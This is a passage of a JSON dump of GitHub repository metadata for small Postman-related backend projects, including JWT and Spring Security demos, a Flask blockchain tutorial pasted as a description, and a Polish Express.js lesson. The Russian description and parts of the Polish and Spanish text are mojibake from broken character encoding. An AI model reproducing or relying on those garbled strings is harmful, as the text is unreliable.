      "laravel",
      "docs",
      "resources",
      "variable",
      "validation",
      "usando",
      "variables",
      "title",
      "gitlab",
      "servicio",
      "prueba",
      "proyecto",
      "empresa",
      "servidor",
      "partir"
    ]
  },
  {
    "id": 65392187,
    "name": "stromtrooper",
    "full_name": "sandeep89/stromtrooper",
    "description": "A mock server to depict usage of postman collections for mocking twitter api responses. (Name=>https://en.wikipedia.org/wiki/Stormtrooper_(Star_Wars))",
    "fork": false,
    "created_at": "2016-08-10T15:05:47Z",
    "updated_at": "2016-08-15T12:43:49Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 5467034,
    "owner_login": "sandeep89",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/5467034?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "collections",
      "postman collection",
      "server",
      "http",
      "postman collections",
      "https",
      "response",
      "mock",
      "responses",
      "wiki",
      "twitter",
      "wikipedia",
      "depict"
    ]
  },
  {
    "id": 193157969,
    "name": "jsonwebtoken",
    "full_name": "gloryer/jsonwebtoken",
    "description": "A demo back end server exposes user registration endpoint, user authentication endpoint, token endpoint and resource endpoint. The resource endpoint is protected by the JWT token. Only the client who possesses the valid token can access the resource. To get a token from the server, the client must authenticates itself to the server. To request the resource in the server, the client issue an http GET request to the resource endpoint, the server will verify the recieved jwt token. Once the token is valid, the server will send back the user information which indicated in the jwt token.  Front-end has not been implemented so far. The back-end is tested using Postman.",
    "fork": false,
    "created_at": "2019-06-21T20:43:09Z",
    "updated_at": "2019-06-21T20:52:18Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 18592154,
    "owner_login": "gloryer",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/18592154?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "request",
      "form",
      "server",
      "client",
      "http",
      "user",
      "implement",
      "format",
      "auth",
      "endpoint",
      "tested",
      "demo",
      "send",
      "source",
      "authentication",
      "info",
      "access",
      "infor",
      "resource",
      "information",
      "token",
      "esse",
      "implemented",
      "expose",
      "been",
      "authenticate",
      "exposes",
      "back end",
      "verify",
      "issue",
      "registration",
      "recieve"
    ]
  },
  {
    "id": 237591004,
    "name": "track-server",
    "full_name": "aymkin/track-server",
    "description": "Back-end for Front-enders, –∑–∞ –¥–≤–∞ —á–∞—Å–∞ –º–æ–∂–Ω–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∫–∞–∫ —Å –º–∏–Ω–∏–º—É–º —É—Å–∏–ª–∏–π: —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å express –Ω–∞–ø–∏—Å–∞—Ç—å 4 —ç–Ω–¥–ø–æ–∏–Ω—Ç–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –∫ MongoDB cloud –±–∞–∑–æ–≤–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ Postman —á—Ç–æ —Ç–∞–∫–æ–µ —Å—Ö–µ–º—ã –∏ –º–æ–¥–µ–ª–∏ (Mongoose) –∑–∞—á–µ–º –Ω—É–∂–µ–Ω JWT (Json Web Token) + –∫–∞–∫ –µ–≥–æ –∏–º–ø–ª–µ–º–µ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å –≤ –ø—Ä–æ–µ–∫—Ç —á—Ç–æ –∑–Ω–∞—á–∏—Ç –Ω–∞—Ç–µ—Ä–µ—Ç—å –∏ –ø—Ä–∏—Å–æ–ª–∏—Ç—å –ø–∞—Ä–æ–ª—å (salting and hashing password) –∏ –ø–æ—á–µ–º—É —ç—Ç–æ –ø–æ –ø—Ä–æ–∞–≤–æ—Å–ª–∞–≤–Ω–æ–º—É –∫–∞–∫ –æ–≥—Ä–∞–Ω–∏—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω—ã–º –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º (middleware authorizationRequire) –æ–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö –æ—à–∏–±–æ–∫ (error handling) —É—Ä–æ–∫–∏ 165-186 https://www.udemy.com/course/the-complete-react-native-and-redux-course/learn/lecture/15707662",
    "fork": false,
    "created_at": "2020-02-01T09:23:42Z",
    "updated_at": "2020-02-02T13:55:06Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 10321850,
    "owner_login": "aymkin",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/10321850?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "express",
      " express",
      "auth",
      "https",
      "learn",
      "course",
      "cloud",
      "complete",
      "react",
      "native",
      "handling",
      "middleware",
      "error",
      "authorization",
      "udemy",
      "redux"
    ]
  },
  {
    "id": 218892035,
    "name": "CursoBackendConNode.js",
    "full_name": "gsuscastellanosSC/CursoBackendConNode.js",
    "description": "Introducci√≥n y bienvenida Guillermo Rodas ser√° tu profesor en este curso, √©l tiene m√°s 6 a√±os dedicado a programar s√≥lo en JavaScript y forma parte del equipo de Auth0, adem√°s de ser Google Developer Expert (GDE) en Web Technologies y organizador de eventos como Medellin CSS y CSS Conf.  Requisitos antes de iniciar:  Node y NPM Editor de texto ya sea vsCode, Atom o Sublime Text Navegador Chrome o Firefox Extensi√≥n JSON viewer Postman en @platzi https://platzi.com/clases/1646-backend-nodejs/22012-introduccion-y-bienvenida/ üíöüíöüíö",
    "fork": false,
    "created_at": "2019-11-01T01:42:18Z",
    "updated_at": "2019-11-05T11:10:30Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 53982913,
    "owner_login": "gsuscastellanosSC",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/53982913?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "node",
      "http",
      "https",
      "view",
      "backend",
      "program",
      "intro",
      "nodejs",
      "text",
      "event",
      "curso",
      "como",
      "bienvenida"
    ]
  },
  {
    "id": 117618110,
    "name": "spring-security-db",
    "full_name": "mmsrgit/spring-security-db",
    "description": "This objective of this project is to perform CRUD operations in a secured way. BASIC authentication is required to insert/update/read/delete the records from RECORDS table using following URLs.  http://localhost:8080/all - GET http://localhost:8080/getSimpleRecord http://localhost:8080/secured/getRecords http://localhost:8080/secured/getRecord/2 http://localhost:8080/secured/createRecord - POST http://localhost:8080/secured/updateRecord - PUT http://localhost:8080/secured/deleteRecord - DELETE  The URLs having secured in it, needs to be hit using BASIC authentication in POSTMAN using mmsr/mmsr as username and password. The default format of the records displayed is json. But you can also view the records in XML by appending the urls with \".xml\" e.g.  http://localhost:8080/secured/getAllRecords - JSON http://localhost:8080/secured/getAllRecords.xml - XML",
    "fork": false,
    "created_at": "2018-01-16T02:05:10Z",
    "updated_at": "2018-12-15T19:19:52Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 1,
    "watchers": 1,
    "score": 1,
    "owner_id": 26504427,
    "owner_login": "mmsrgit",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/26504427?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "form",
      "json",
      "http",
      "user",
      "format",
      "auth",
      "operation",
      "local",
      "read",
      "authentication",
      "operations",
      "update",
      "view",
      "host",
      "delete",
      "perform",
      "play",
      "need",
      "name",
      "object",
      "require",
      "following",
      "needs",
      "default",
      "display",
      "required",
      "having",
      "insert",
      "secure",
      "secured",
      "urls",
      "objective"
    ]
  },
  {
    "id": 193515124,
    "name": "NodeJsExpressMongoDB",
    "full_name": "MayMP/NodeJsExpressMongoDB",
    "description": "This is a very basic example of (`List All Data`, `Detail By Each Id`, `Create`, `Update`, `Delete`) in Node.js and MongoDB.  Running Locally Make sure you have Node.js(`https://nodejs.org/en/`) and the MongoDB for 32-bit(`https://www.mongodb.org/dl/win32/i386`) and for others (`https://www.mongodb.com/download-center/community`) installed.  You're gonna need to create a DB named `InterviewDB` and import from the `MongoDB(For Interview)` folder. And please create collection name `posts`. You can adjust the database configuration in `app/config/config.json`.  You can run \" node app.js \" from the project directory in command prompt.  You can call url(`localhost:8080`) from your `Postman` or `Restful`.",
    "fork": false,
    "created_at": "2019-06-24T13:52:01Z",
    "updated_at": "2020-03-04T12:56:55Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 52011773,
    "owner_login": "MayMP",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/52011773?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "create",
      "data",
      "call",
      "node",
      "database",
      "json",
      "http",
      "example",
      "mongo",
      "https",
      "load",
      "local",
      "import",
      "view",
      "host",
      "config",
      "very",
      "command",
      "mongod",
      "mongodb",
      "need",
      "name",
      "nodejs",
      "configuration",
      "install",
      "unit",
      "folder",
      "download",
      "enter",
      "posts",
      "directory",
      "installed",
      "please",
      "unity",
      "named",
      "center"
    ]
  },
  {
    "id": 156987865,
    "name": "Blockchain",
    "full_name": "Gyanachand1/Blockchain",
    "description": "# Module 1 - Create a Blockchain  # To be installed: # Flask==0.12.2: pip install Flask==0.12.2 # Postman HTTP Client: https://www.getpostman.com/  # Importing the libraries import datetime import hashlib import json from flask import Flask, jsonify  # Part 1 - Building a Blockchain  class Blockchain:      def __init__(self):         self.chain = []         self.create_block(proof = 1, previous_hash = '0')      def create_block(self, proof, previous_hash):         block = {'index': len(self.chain) + 1,                  'timestamp': str(datetime.datetime.now()),                  'proof': proof,                  'previous_hash': previous_hash}         self.chain.append(block)         return block      def get_previous_block(self):         return self.chain[-1]      def proof_of_work(self, previous_proof):         new_proof = 1         check_proof = False         while check_proof is False:             hash_operation = hashlib.sha256(str(new_proof**2 - previous_proof**2).encode()).hexdigest()             if hash_operation[:4] == '0000':                 check_proof = True             else:                 new_proof += 1         return new_proof          def hash(self, block):         encoded_block = json.dumps(block, sort_keys = True).encode()         return hashlib.sha256(encoded_block).hexdigest()          def is_chain_valid(self, chain):         previous_block = chain[0]         block_index = 1         while block_index < len(chain):             block = chain[block_index]             if block['previous_hash'] != self.hash(previous_block):                 return False             previous_proof = previous_block['proof']             proof = block['proof']             hash_operation = hashlib.sha256(str(proof**2 - previous_proof**2).encode()).hexdigest()             if hash_operation[:4] != '0000':                 return False             previous_block = block             block_index += 1         return True  # Part 2 - Mining our Blockchain  # Creating a Web App app = Flask(__name__)  # Creating a Blockchain blockchain = Blockchain()  # Mining a new block @app.route('/mine_block', methods = ['GET']) def mine_block():     previous_block = blockchain.get_previous_block()     previous_proof = previous_block['proof']     proof = blockchain.proof_of_work(previous_proof)     previous_hash = blockchain.hash(previous_block)     block = blockchain.create_block(proof, previous_hash)     response = {'message': 'Congratulations, you just mined a block!',                 'index': block['index'],                 'timestamp': block['timestamp'],                 'proof': block['proof'],                 'previous_hash': block['previous_hash']}     return jsonify(response), 200  # Getting the full Blockchain @app.route('/get_chain', methods = ['GET']) def get_chain():     response = {'chain': blockchain.chain,                 'length': len(blockchain.chain)}     return jsonify(response), 200  # Checking if the Blockchain is valid @app.route('/is_valid', methods = ['GET']) def is_valid():     is_valid = blockchain.is_chain_valid(blockchain.chain)     if is_valid:         response = {'message': 'All good. The Blockchain is valid.'}     else:         response = {'message': 'Houston, we have a problem. The Blockchain is not valid.'}     return jsonify(response), 200  # Running the app app.run(host = '0.0.0.0', port = 5000)",
    "fork": false,
    "created_at": "2018-11-10T14:17:52Z",
    "updated_at": "2018-11-10T14:21:28Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 32057619,
    "owner_login": "Gyanachand1",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/32057619?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "json",
      "http",
      "code",
      "route",
      "https",
      "operation",
      "full",
      "import",
      "response",
      "host",
      "method",
      "name",
      "check",
      "chai",
      "message",
      "getpost",
      "problem",
      "class",
      "methods",
      "install",
      "flask",
      "blockchain",
      "sort",
      "mine",
      "while",
      "installed",
      "previous",
      "proof",
      "datetime"
    ]
  },
  {
    "id": 119091462,
    "name": "Zadanie_17_5",
    "full_name": "martinproxy0/Zadanie_17_5",
    "description": " 17. ExpressJS - ekspresowe tworzenie aplikacji w NodeJS Wyzwania: Dowiesz siƒô czym jest ExpressJS Nauczysz siƒô korzystaƒá z routingu Poznasz czym sƒÖ szablony 17.1. Wprowadzenie do Expressa Express jest jednym z najpopularniejszych framework√≥w dla aplikacji pisanych w Node.js. Jest bardzo lekki i pozwala na lepszƒÖ organizacjƒô aplikacji w modelu MVC. Ok, zwolnijmy. Ju≈º na samym starcie pojawi≈Çy siƒô dwa pojƒôcia, kt√≥rych do tej pory nie om√≥wili≈õmy zbyt dok≈Çadnie: framework i MVC. Na poczƒÖtku przypomnijmy sobie czym jest framework.  Czym sƒÖ frameworki? Framework to swego rodzaju szkielet, na kt√≥rym opieramy budowƒô naszej aplikacji. Jest pewnym poziomem abstrakcji, na kt√≥rej konstruujemy naszƒÖ aplikacjƒô.  Czym jest abstrakcja? Abstrakcja w in≈ºynierii oprogramowania to technika, dziƒôki kt√≥rej jeste≈õmy w stanie zapanowaƒá nad z≈Ço≈ºono≈õciƒÖ systemu. Najzwyczajniej w ≈õwiecie nie da siƒô my≈õleƒá na wielu p≈Çaszczyznach na raz, dlatego programi≈õci dzielƒÖ problemy na pewne poziomy i to na nich rozwiƒÖzujƒÖ mniejsze problemy. Przyk≈Çadowo - programista korzystajƒÖcy z Reacta nie martwi siƒô o ni≈ºszy poziom abstrakcji, z kt√≥rego nie≈õwiadomie korzysta u≈ºywajƒÖc Reacta. KorzystajƒÖc z komputera tak≈ºe nie zastanawiamy siƒô za bardzo co dzieje siƒô w ≈õrodku procesora czy te≈º w jaki spos√≥b jest skonstruowany. Tym poziomem abstrakcji po prostu nie zawracamy sobie g≈Çowy. U≈ºywajƒÖc JavaScriptu nie my≈õlimy w jaki spos√≥b parser analizuje sk≈Çadniƒô jƒôzyka. Je≈õli nie jest to nam potrzebne, to mo≈ºemy zajƒÖƒá siƒô tym, co jest dla nas naprawdƒô istotne - pisaniem aplikacji internetowych!  Express to w≈Ça≈õnie kolejny, wy≈ºszy poziom abstrakcji, dziƒôki kt√≥remu mo≈ºemy skupiƒá siƒô na w≈Ça≈õciwym problemie. Zawiera zbi√≥r generycznych (mo≈ºliwych do zastosowania w wielu miejscach / uniwersalnych) funkcjonalno≈õci, kt√≥re powtarzajƒÖ siƒô w obrƒôbie ka≈ºdej aplikacji. Ca≈Çy zamys≈Ç frameworka opiera siƒô na zasadzie - nie wymy≈õlaj ko≈Ça na nowo, bo mo≈ºna budowaƒá na podstawie dobrych, uniwersalnych rozwiƒÖza≈Ñ. Po wykonaniu tego samego zadania wiele razy, cz≈Çowiek instynktownie szuka sposobu na automatyzacjƒô problemu - szczeg√≥lnie leniwy programista. :)  Framework ma niestety jednƒÖ wadƒô, kt√≥ra bywa momentami r√≥wnie≈º zaletƒÖ - narzuca programi≈õcie spos√≥b w jaki nale≈ºy rozwiƒÖzaƒá problem. Takie podej≈õcie z jednej strony nieco nas ogranicza, bo nie pozwala nam 'grzebaƒá' w rozwiƒÖzaniu, a z drugiej strony zmniejsza ilo≈õƒá miejsc, w kt√≥rych mogliby≈õmy pope≈Çniƒá jaki≈õ b≈ÇƒÖd. ZaletƒÖ takiego podej≈õcia jest te≈º to, ≈ºe programi≈õci korzystajƒÖcy z framework√≥w czƒôsto borykajƒÖ siƒô z podobnymi problemami, przez co ≈Çatwo jest znale≈∫ƒá rozwiƒÖzania, bo kto≈õ ju≈º na pewno zetknƒÖ≈Ç siƒô z czym≈õ, co sprawia nam k≈Çopot :)  WracajƒÖc do Expressa - jest on niewielkim frameworkiem, kt√≥ry daje programi≈õcie przyjemnƒÖ podstawkƒô do tworzenia aplikacji, ale nie narzuca ≈ºadnych praktyk - mo≈ºe o tym ≈õwiadczyƒá chocia≈ºby fakt, ≈ºe wiele znanych framework√≥w opiera swojƒÖ budowƒô na Express. Mo≈ºna do nich zaliczyƒá przyk≈Çadowo Loopbacka, Sailsa czy Krakena.  Model-View-Controller Ok, wiemy ju≈º czym jest framework - pora na pojƒôcie MVC :) Jest to skr√≥t od ang. Model View Controller (Model Widok Kontroler). Jest jednym z najczƒô≈õciej przewijajƒÖcych siƒô wzorc√≥w architektonicznych w internecie. Popularno≈õciƒÖ poma≈Çu wypiera go architektura Flux, o kt√≥rej coraz czƒô≈õciej s≈Çychaƒá (szczeg√≥lnie w ≈õrodowisku Reacta), ale o tym wzorcu powiemy sobie jeszcze przy okazji omawiania Reduxa - wr√≥ƒámy do MVC.  G≈Ç√≥wnym za≈Ço≈ºeniem przyjƒôtym podczas projektowania MVC by≈Ço oddzielenie warstwy prezentacji od logiki biznesowej aplikacji. To podej≈õcie umo≈ºliwia tworzenie narzƒôdzi dzia≈ÇajƒÖcych bez graficznego interfejsu (zastƒôpuje go wtedy tzw. Command Line Interface, a.k.a. CLI) i jest dalej popularne w ≈õrodowisku Unixowym. Tak wiƒôc:  Model jest reprezentacjƒÖ logiki aplikacji / problemu z jakim siƒô zmagamy / domenƒÖ. Widok opisuje w jaki spos√≥b co≈õ wy≈õwietliƒá. W React sƒÖ to komponenty (szczeg√≥lnie te prezentacyjne). Kontroler przyjmuje dane od u≈ºytkownika aplikacji i reaguje na jego dzia≈Çania w obrƒôbie widoku. Aktualizuje widok i model aplikacji. O samej architekturze mo≈ºna napisaƒá osobny modu≈Ç tym bardziej, ≈ºe jak ju≈º wcze≈õniej wspomnieli≈õmy bardzo czƒôsto przewija siƒô on w ≈õrodowisku front-end developer√≥w i jest czƒô≈õciƒÖ sk≈ÇadowƒÖ wielu framework√≥w. Sama implementacja MVC wymaga wiedzy na temat programowania obiektowego i wzorc√≥w projektowych. Zainteresowanych zapraszam do przeczytania tej ksiƒÖ≈ºki na temat wzorc√≥w projektowych stosowanych w JavaScripcie.  Express dostarcza wielu funkcjonalno≈õci do tworzenia aplikacji webowych. Jak ju≈º wspomnia≈Çem, u≈Çatwia on przede wszystkim szybki rozw√≥j aplikacji opartych na Node.js. Podstawowymi cechami tego frameworka sƒÖ:  serwowanie plik√≥w statycznych za pomocƒÖ jednej komendy konfigurowanie middleware, czyli po≈õrednika miƒôdzy ≈ºƒÖdaniem a odpowiedziƒÖ w momencie, kiedy u≈ºytkownik wykonuje jakie≈õ akcje, np. wysy≈Ça formularz, middleware mo≈ºe wykonaƒá pewne czynno≈õci zanim dane zostanƒÖ zapisane. Nie sprowadza siƒô to oczywi≈õcie tylko do zapisu danych, ale szerzej na temat tego zagadnienia powiemy sobie w dalszym rozdziale definiowanie tablicy routingu, czyli ≈õcie≈ºek (adres√≥w), kt√≥re wy≈õwietlajƒÖ odpowiednie tre≈õci, przyjmujƒÖ i zapisujƒÖ dane, bƒÖd≈∫ odpytane o dane zwracajƒÖ je. BazujƒÖ na protokole HTTP oraz URI (ang. Uniform Resource Identifier) pozwala na dynamiczne tworzenie stron HTML bazujƒÖcych na argumentach przekazanych do istniejƒÖcych szablon√≥w Nie przejmuj siƒô, je≈õli powy≈ºsze opisy wydajƒÖ siƒô byƒá nieco zagmatwane. Kolejne rozdzia≈Çy rozja≈õniƒÖ sprawƒô! Zanim jednak przejdziemy do omawiania poszczeg√≥lnych funkcjonalno≈õci Expressa, przeprowadzimy proces instalacji.  Je≈õli masz wƒÖtpliwo≈õci do powy≈ºszego materia≈Çu, to - zanim zatwierdzisz - zapytaj na czacie :) Zapozna≈Çe(a)m siƒô! 17.2. Instalacja ExpressJS Framework Express instalujemy u≈ºywajƒÖc npm, analogicznie do innych pakiet√≥w, kt√≥re dodawali≈õmy ju≈º we wcze≈õniejszych modu≈Çach. Dla przypomnienia, wystarczy, ≈ºe zainicjujesz sw√≥j projekt - npm init, a nastƒôpnie u≈ºyjesz komendy npm install express --save, kt√≥ra zapisze zainstalowany pakiet w katalogu node_modules/ i doda go do sekcji dependencies w pliku package.json.  Razem z Expressem nale≈ºy zainstalowaƒá jeszcze jeden wa≈ºny modu≈Ç - body-parser, kt√≥ry jest pakietem pozwalajƒÖcym na obs≈Çugƒô r√≥≈ºnych format√≥w danych w middleware takich jak JSON, text czy tzw. surowe dane (ang. raw data). Aby go zainstalowaƒá, wpisz npm install body-parser --save.  Pierwsza aplikacja w ExpressJS Sprawd≈∫my teraz, czy wszystko dzia≈Ça tak jak powinno. Testowa aplikacja, jakƒÖ stworzymy przy u≈ºyciu Expressa, bƒôdzie przedstawia≈Ça podstawowƒÖ zasadƒô dzia≈Çania tego frameworka. Aplikacja uruchomi serwer oraz bƒôdzie nas≈Çuchiwaƒá na porcie 3000 w oczekiwaniu na po≈ÇƒÖczenie - dok≈Çadnie w taki sam spos√≥b, jak w przypadku serwera HTTP napisanego w ‚Äúczystym\" Node.js. Nas≈Çuchiwanie oznacza nic innego jak oczekiwanie na po≈ÇƒÖczenie - po wystƒÖpieniu ≈ºƒÖdania, serwer odpowie nam klasycznym ‚ÄúHello world\".  Zanim zaczniemy tworzyƒá aplikacjƒô, musimy wyt≈Çumaczyƒá sobie pewne pojƒôcia.  Opis pojƒôcia routingu Routing to spos√≥b okre≈õlania jak aplikacja bƒôdzie odpowiadaƒá na ≈ºƒÖdania klienta na dane endpointy przy u≈ºyciu konkretnych metod HTTP. Przypomnijmy sobie w jaki spos√≥b wyglƒÖda≈Çy metody HTTP:  GET - najprostsza z metod HTTP - s≈Çu≈ºy do pobierania zasob√≥w z serwera. Pobranymi zasobami mogƒÖ byƒá np. pliki HTML, CSS, JavaScript czy obiekty JSON / XML. POST - ta metoda jest u≈ºywana do wysy≈Çania danych do serwera. Stosuje siƒô jƒÖ np. przy formularzach lub przy wstawianiu zdjƒôƒá i wysy≈Çaniu ich jako za≈ÇƒÖcznik. Zwykle dane te wysy≈Çane sƒÖ jako para klucz-warto≈õƒá. PUT - dzia≈Ça podobnie jak POST, czyli r√≥wnie≈º s≈Çu≈ºy do wysy≈Çania danych. R√≥≈ºnicƒÖ jest ograniczenie do wys≈Çania tylko jednej porcji danych - np. jednego pola. Metoda ta najczƒô≈õciej u≈ºywana jest do aktualizacji istniejƒÖcych danych DELETE - metoda, kt√≥ra s≈Çu≈ºy do usuwania danych z serwera. Chodzi oczywi≈õcie o dane, kt√≥re zosta≈Çy wskazane przy wysy≈Çaniu ≈ºƒÖdania. Kolejnym pojƒôciem jest URI (nazywane r√≥wnie≈º PATH) - jest to w≈Ça≈õnie wspomniany wcze≈õniej endpoint, kt√≥ry zawiera polecenia do wykonania gdy zostanie wywo≈Çany przez ≈ºƒÖdanie.  Czas start! Na poczƒÖtek stw√≥rzmy plik server.js w katalogu z projektem. Po zainstalowaniu powy≈ºszych zale≈ºno≈õci, drzewo projektu powinno wyglƒÖdaƒá w nastƒôpujƒÖcy spos√≥b:   Aby mieƒá mo≈ºliwo≈õƒá skorzystania z zainstalowanych zale≈ºno≈õci, na poczƒÖtku nale≈ºy zadeklarowaƒá zmiennƒÖ, w kt√≥rej bƒôdziemy przechowywaƒá funkcjonalno≈õci pakietu Expressa.  var express = require('express'); Jak widzisz, ka≈ºda paczka JS'a dzia≈Ça dok≈Çadnie w taki sam spos√≥b. Koncepcja modu≈Ç√≥w bƒôdzie przewijaƒá siƒô a≈º do ko≈Ñca tego kursu. Nastƒôpnym krokiem bƒôdzie stworzenie aplikacji Express:  var app = express(); NaszƒÖ aplikacjƒô przypisali≈õmy do zmiennej app. Teraz mo≈ºemy sprawiƒá, aby odpowiada≈Ça prostym Hello world w momencie, w kt√≥rym odbierzemy wys≈Çane zapytanie GET na adres strony domowej:  app.get('/', function(req, res) {     res.send('Hello world'); }); Powy≈ºszy kod rejestruje pierwszy routing (proces przetwarzania otrzymanego adresu ≈ºƒÖdania i na jego podstawie decydowanie, co powinno zostaƒá uruchomione) na wys≈Çane ≈ºƒÖdanie GET po wej≈õciu na stronƒô g≈Ç√≥wnƒÖ ( http://localhost:3000/ ). Jako callback na wystƒÖpienie tego zdarzenia wywo≈Çywana jest funkcja, kt√≥ra w przypadku udanej odpowiedzi wy≈õle wiadomo≈õƒá Hello world.  To jednak jeszcze nie koniec. Zarejestrowali≈õmy obs≈Çugƒô pierwszego routingu, ale nale≈ºy zainicjowaƒá nas≈Çuchiwanie serwera na to i inne zdarzenia. Dopiszmy wiƒôc:  var server = app.listen(3000, function() {     console.log('Przyk≈Çadowa aplikacja nas≈Çuchuje na http://localhost:3000'); }); Po zapisaniu powy≈ºszego kodu, nale≈ºy uruchomiƒá go komendƒÖ node server.js (lub za pomocƒÖ Nodemona, kt√≥rego poznali≈õmy w pierwszym module) - teraz po ponownym wej≈õciu na adres http://localhost:3000/ powinni≈õmy zobaczyƒá nastƒôpujƒÖcy widok:   Jest to znak, ≈ºe nasza aplikacja dzia≈Ça!  Je≈õli masz wƒÖtpliwo≈õci do powy≈ºszego materia≈Çu, to - zanim zatwierdzisz - zapytaj na czacie :) Zapozna≈Çe(a)m siƒô! 17.3. Route, czyli ≈õcie≈ºka wyznaczona dla u≈ºytkownika aplikacji Wykorzystanie endpoint√≥w Rozwi≈Ñmy teraz trochƒô aplikacjƒô stworzonƒÖ w poprzednim podrozdziale. Aktualnie kod w pliku server.js wyglƒÖda nastƒôpujƒÖco:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przyk≈Çadowa aplikacja nas≈Çuchuje na http://localhost:3000'); }); Endpointy statyczne Na poczƒÖtek zmodyfikujemy lekko ≈ºƒÖdanie GET i do strony g≈Ç√≥wnej zamiast Hello world! wpiszmy Hello GET! oraz dodamy linijkƒô drukujƒÖcƒÖ otrzymane ≈ºƒÖdanie (po stronie serwera) jak poni≈ºej:  app.get('/', function (req, res) {     console.log('Otrzyma≈Çem ≈ºƒÖdanie GET do strony g≈Ç√≥wnej');     res.send('Hello GET!'); }); Warto w tym miejscu wspomnieƒá o narzƒôdziu Postman - mo≈ºesz pobraƒá je ze strony https://www.getpostman.com/. U≈ºywa siƒô go do testowania endpoint√≥w. Postman jest prosty i intuicyjny w obs≈Çudze - wystarczy, ≈ºe podasz adres oraz metodƒô HTTP, jakiej chcesz u≈ºyƒá w odpowiednich polach i‚Ä¶ ju≈º :) Pozostaje tylko wys≈Çanie requesta i sprawdzenie czy response zgadza siƒô z naszymi oczekiwaniami.   Dodajmy te≈º inne metody HTTP do naszej aplikacji. Zacznijmy od POST. Dla tej i kolejnej metody wykonamy podobne operacje. Chodzi tutaj o to, aby zaobserwowaƒá dzia≈Çanie zarejestrowanych endpoint√≥w.  app.post('/', function (req, res) {     console.log('Otrzyma≈Çem ≈ºƒÖdanie POST do strony g≈Ç√≥wnej');     res.send('Hello POST!'); }); Do tego czasu oba nasze zapytania kierowali≈õmy do strony domowej. Dodajmy teraz obs≈Çugƒô ≈ºƒÖdania z metodƒÖ DELETE oraz innƒÖ ≈õcie≈ºkƒÖ:  app.delete('/del_user', function (req, res) {     console.log('Otrzyma≈Çem ≈ºƒÖdanie DELETE do strony /del_user');     res.send('Hello DELETE!'); }); DLA CHƒòTNYCH: Przetestuj powy≈ºsze zapytanie w Postmanie! :)  Dla praktyki, dodajmy jeszcze kilka innych endpoint√≥w, a nastƒôpnie przejd≈∫my do testowania.  app.get('/list_user', function (req, res) {     console.log('Otrzyma≈Çem ≈ºƒÖdanie GET do strony /list_user');     res.send('Strona z listƒÖ u≈ºytkownik√≥w!'); });  app.get('/ab*cd', function(req, res) {     console.log('Otrzyma≈Çem ≈ºƒÖdanie GET do strony /ab*cd');     res.send('Wz√≥r pasuje'); }); Po dodaniu powy≈ºszych fragment√≥w kodu zapisz plik server.js, a nastƒôpnie ponownie u≈ºyj komendy node server.js chyba, ≈ºe u≈ºywasz Nodemona :)  Zerknijmy na endpoint /list_user   Otrzymali≈õmy to, czego oczekiwali≈õmy. Sprawd≈∫my jeszcze inne.    Je≈õli jednak u≈ºyli≈õmy endpointa, kt√≥rego nie zdefiniowali≈õmy, otrzymamy odpowied≈∫ jak na ostatnim obrazku.  Endpointy dynamiczne Istnieje r√≥wnie≈º inny typ endpoint√≥w, kt√≥re nazywa siƒô dynamicznymi. U≈ºywanie ich pozwala na przekazywanie parametr√≥w i bazowanie na nich. Wr√≥ƒámy na moment do kodu stworzonego na samym poczƒÖtku:  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, function() {     console.log('Przyk≈Çadowa aplikacja nas≈Çuchuje na http://localhost:3000'); }); Najpierw zmodyfikujemy trochƒô bazowy kod. Usu≈Ñmy linijki 8-10, kt√≥re mia≈Çy nam tylko pokazaƒá podstawowe informacje na temat serwera. Zamiast tego napiszmy po prostu: app.listen(3000);  Tworzenie dynamicznego routingu pozwala na przekazywanie parametr√≥w, wiƒôc spr√≥bujmy najpierw z przyk≈Çadowym id. Zamiast odwo≈Çaƒá siƒô do strony domowej ('/'), odwo≈Çajmy siƒô do zmiennego parametru id. Parametr zmienny od statycznego rozr√≥≈ºnia siƒô poprzez dodanie dwukropka (:) przed nazwƒô. W naszym przyk≈Çadzie endpoint bƒôdzie wiƒôc wyglƒÖda≈Ç nastƒôpujƒÖco:  /:id Zmie≈Ñmy jeszcze odpowied≈∫ z Hello world na 'Identyfikator, kt√≥ry zosta≈Ç dopisany to ' + req.params.id.  Czym 